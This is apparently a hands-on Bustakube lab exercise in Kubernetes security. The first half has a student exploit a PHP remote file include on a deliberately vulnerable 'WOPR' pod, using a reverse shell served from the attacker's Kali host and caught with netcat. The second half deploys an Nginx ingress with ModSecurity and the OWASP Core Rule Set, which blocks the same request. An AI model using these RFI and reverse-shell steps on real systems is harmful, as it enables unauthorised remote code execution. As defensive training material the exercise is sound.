---
layout: exercise
exercise: 110
title: "Exercise: Kubernetes Ingresses with Modsecurity"
tools: openssh-client netcat-traditional
directories_to_sync: 
---


## Steps

1. Start up a fresh `lxterminal` by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. Alternatively, use the hot key sequence below:

    ```
    <hold down Alt><hit F2>lxterminal<HIT the enter key>
    ```

2. SSH into the control plane node on the Kubernetes cluster:

    ```shell
    ssh -i /sync/bustakube-node-key root@bustakube-controlplane
    ```
    
3. Activate the WOPR scenario:

    ```shell
    /usr/share/bustakube/Scenario-WOPR/stage-scenario-wopr.sh
    ```
    
4. Start up Firefox and browse to this URL.  You can use the icon on the desktop, or use the process from step 1.

    <http://bustakube-node-1:31374>

5. You should see a quote from a classic movie, "SHALL WE PLAY A GAME?" Do your best to imagine a robotic computer voice saying these words.

6. Click the "Chess" button and observe that the URL in the browser URL bar shows this:

    ```
    http://bustakube-node-1:31374/index.php?page=chess
    ```

7. It turns out that this page is a form (`index.php`) that sends and receives a parameter called `page`. The form then loads (includes) the PHP filename stored in `page`, but appends a `.php` to it. Let's test this for a remote file include.

8. First, you'll set up a simple web server in a terminal using python. Start by switching to your existing `lxterminal` window.

9. Now start a new tab by hitting `Ctrl-Shift-t`.

10. Now start a simple Python-based web server, listening on port `8001`:

    ```shell
    python3 -m http.server 8001
    ```

11. It's important to know that your Kali system has the IP address `10.23.58.30` on the virtual machine network local to your system.

12. Now go back to the browser and change the URL's `page` parameter to a non-existent PHP file on your Kali system - your URL should now read:

    ```
    http://bustakube-node-1:31374/index.php?page=http://10.23.58.30:8001/rfi-likely
    ```

13. Go back to the `lxterminal` window to see if the web server received an incoming request.  If it did, you should see a log message that has `GET /rfi-likely.php` in it. While yours won't be an exact match, it will look something like this:

    ```
    10.23.58.41 - - [06/Aug/2022 10:00:00] "GET /rfi-likely.php HTTP/1.0" 404 -
    ```

14. This demonstrates that if we change the page parameter to a URL, the `index.php` application will append `.php` to the URL, fetch it, and may even execute it.

15. Start up another `lxterminal` tab by hitting `Ctrl-Shift-t`.

16. Copy a PHP reverse shell into the home directory that your web server is serving:

    ```shell
    cp /usr/share/webshells/php/php-reverse-shell.php ~/phprs.php
    ```

17. Set the IP address in the reverse shell script to your Kali host's `10.23.58.30` IP address:

    ```shell
    sed -i 's/127.0.0.1/10.23.58.30/' ~/phprs.php
    ```

18. Set up a netcat listener to catch the shell coming back from anyone who runs this script:

    ```shell
    nc -l -p 1234
    ```

19. Now, let's trigger our exploitation. Go back to the browser window and submit the index.php form again, this time setting `page` to `http://10.23.58.30:8001/phprs` - your URL bar should look like this:

    ```
    http://bustakube-node-1:31374/index.php?page=http://10.23.58.30:8001/phprs
    ```

20. Go back to the terminal window - you should find yourself with a connection to your netcat listener that gives you a nice juicy shell on a system called `wopr` - here's the output from our test system:

    ```
    Linux wopr 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux
    03:48:22 up 1 day,  3:44,  0 users,  load average: 0.07, 0.11, 0.05
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $
    ```

21. Take a look at the root directory that you find yourself in - you should see a file called `FLAG-1.png`:

    ```shell
    ls /
    ```

22. Copy the flag file into the web server directory so you can easily view it.

    ```shell
    cp FLAG-1.png  /var/www/html/
    ```

23. Take a look at the flag with your browser.  Switch over to Firefox and browse to this URL:

    <http://bustakube-node-1:31374/FLAG-1.png>

24. Now let's set up an Nginx Ingress controller on our Kubernetes cluster, with ModSecurity running the OWASP ModSecurity Core Rule Set (CRS). First, switch back to the `lxterminal` window and hit `Ctrl-Shift-t` to start a new terminal tab.

25. Now SSH into the Bustakube Control Plane node.

    ```shell
    ssh bustakube@bustakube-controlplane
    bustakube
    ```

26. Next, sudo to root:

    ```shell
    sudo su -
    ```

27. Now, set up Helm to use the official `ingress-nginx` chart repository, locally dubbing this repo `ingress-nginx`, using the `helm repo add` command:

    ```shell
    helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
    ```

28. We're going to install the ingress-nginx chart from this repo, but first let's find out what chart values we can override/set with `helm show values`:

    ```shell
    helm show values ingress-nginx/ingress-nginx
    ```

29. Write these values out to a file for later reference:

    ```shell
    helm show values ingress-nginx/ingress-nginx >nginx_values_orig.yaml
    ```

30. Take a look at this file if you'd like:

    ```shell
    less nginx_values_orig.yaml
    ```

31. The Nginx ingress listens on a `nodePort`, that is, a port that all nodes in the cluster will make available to the outside world and will forward on to the pods who have the right labels. By default, the ingress will get randomly-chosen ports for both HTTP and HTTPS. Let's override this by requesting specific ports in a YAML file whose structure matches that of the `nginx_values_orig.yaml` file.

    ```shell
    cat <<END >nginx_values.yaml
    controller:
      service:
        nodePorts:
          http: "32080"
          https: "32443"
    END
    ```

32. Use the `helm install` to create an install called `ingress-nginx` from the ingress-nginx repo's ingress-nginx chart, providing our `nginx_values.yaml` override file:

    ```shell
    helm install ingress-nginx ingress-nginx/ingress-nginx \
     -n ingress-nginx --create-namespace -f nginx_values.yaml
    ```

33. The last command also created an `ingress-nginx` namespace in your Kubernetes cluster. List the installed releases in that namespace:

    ```shell
    helm list -n ingress-nginx
    ```

34. Now, let's see the pods that the chart created in the `ingress-nginx` namespace, along with their labels:

    ```shell
    kubectl -n ingress-nginx get pods --show-labels
    ```

35. Let's run a command to wait for the pod to be "Ready" - instead of referring to the pod by name, we'll refer to it by a label it has. Use `kubectl wait` to be told when there is a pod ready whose `app.kubernetes.io/component` label is set to `controller`:

    ```shell
    kubectl -n ingress-nginx wait --for=condition=ready pod \
      --selector=app.kubernetes.io/component=controller
    ```

36. The Helm chart also created services. List them:

    ```shell
    kubectl -n ingress-nginx get services
    ```

37. Notice that the `ingress-nginx-controller` service listens on TCP port `32080`, forwarding that to TCP port `80`. Here's the output from our test system:

    ```
    NAME                                 TYPE           CLUSTER-IP       EXTERNAL-IP   PORT(S)                      AGE
    ingress-nginx-controller             LoadBalancer   10.105.156.146   <pending>     80:32080/TCP,443:32443/TCP   50s
    ingress-nginx-controller-admission   ClusterIP      10.98.231.102    <none>        443/TCP                      50s
    ```

38. Check out what configMaps Helm installed:

    ```shell
    kubectl -n ingress-nginx get configmaps
    ```

39. We're going to tweak global settings of the Nginx ingress controller by altering the configMap named `ingress-nginx-controller`. First, set a variable to that configMap name, to make these lines a little shorter:

    ```shell
    cm_name="ingress-nginx-controller"
    ```
    
40. Take a look at it as is:

    ```shell
    kubectl -n ingress-nginx get configmap $cm_name -o yaml
    ```

41. Let's update this configMap to activate `modSecurity` and the OWASP ModSecurity Core Rule Set (CRS) for all ingresses. First, you can see how you can use `yq` to add an item to the data section of the configMap spec. Without writing a modified YAML manifest to disk, use `yq` to add `"enable-modsecurity" = "true"`:

    ```shell
    kubectl -n ingress-nginx get cm $cm_name -o yaml | \
       yq '.data."enable-modsecurity"="true"'
    ```

42. Now, let's write out a YAML file to disk that makes that specific addition:

    ```shell
    kubectl -n ingress-nginx get cm $cm_name -o yaml | \
       yq '.data."enable-modsecurity"="true"' \
       >cm-ingress-nginx-controller.yaml
    ```

43. Next, let's add another key-value pair to the data section of that YAML file. This command adds `"enable-owasp-modsecurity-crs"="true"` and writes the result out to `configmap-ingress-nginx-controller.yaml`:

    ```shell
    cat cm-ingress-nginx-controller.yaml | \
      yq '.data."enable-owasp-modsecurity-crs"="true"' \
      >configmap-ingress-nginx-controller.yaml
    ```

44. Finally, let's use `kubectl apply` to replace the cluster's current configMap with the one in this file:

    ```shell
    kubectl apply -f configmap-ingress-nginx-controller.yaml
    ```

45. We now have a configured Nginx ingress controller, with ModSecurity activated and running the OWASP Core Rule Set. Let's create an ingress that forces traffic through it to reach the `wopr` pod. Take a look at the ingress we've placed in this scenario's `Defense` directory:

    ```shell
    cat /usr/share/bustakube/Scenario-WOPR/Defense/ingress-wopr.yaml
    ```

46. Now create the ingress:

    ```shell
    kubectl create -f \
    /usr/share/bustakube/Scenario-WOPR/Defense/ingress-wopr.yaml
    ```

47. Remove the `WOPR`'s `nodePort`, so it can't be reached except through the ingress:

    ```shell
    kubectl delete svc wopr
    ```

48. Finally, replace a `nodePort` that is reachable in the cluster, so the ingress has a service to connect to:

    ```shell
    kubectl create svc clusterip wopr --tcp=80:80
    ```

49. It's time for the moment of truth. Test the attack you used before, but using `curl` instead and using the ingress port. First, start a new terminal tab by hitting `Ctrl-shift-t`.

50. Load the WOPR front page:

    ```shell
    curl -H "Host: wopr" http://bustakube-node-1:32080/
    ```

51. You should observe the HTML used for the WOPR - on our test system, it looks something like this:

    ```
    <br/><html>
    <head>
    <title>War Operation Plan Response</title>
    </head>
    <body>
    GREETINGS PROFESSOR FALKEN.
    <p>
    Hello.
    <p>
    HOW ARE YOU FEELING TODAY?
    <p>
    SHALL WE PLAY A GAME?
    <p>
    <a href="index.php?page=chess"><button>Chess</button></a>
    <a href="index.php?page=war"><button>Global Thermonuclear War</button></a>
    <a href="index.php?page=checkers"><button>Checkers</button></a>
    <a href="index.php?page=backgammon"><button>Backgammon</button></a>
    <br/>
    <br/>
    <br/></body></html>
    ```

52. Now try your attack:

    ```shell
    
    curl -H "Host: wopr" \
    http://bustakube-node-1:32080/index.php?page=http://10.23.58.30:8001/phprs
    ```

53. Observe that you get a `403 Forbidden` message. Here's the output from our test system:

    ```
    <html>
    <head><title>403 Forbidden</title></head>
    <body>
    <center><h1>403 Forbidden</h1></center>
    <hr><center>nginx</center>
    </body>
    </html>
    ```

54. Close this `lxterminal` tab with:

    ```shell
    exit
    ```

55. Now that you're back in your `root@bustakube-controlplane` tab, please uninstall the `ingress-nginx` ingress via Helm:

    ```shell
    helm -n ingress-nginx uninstall ingress-nginx
    ```
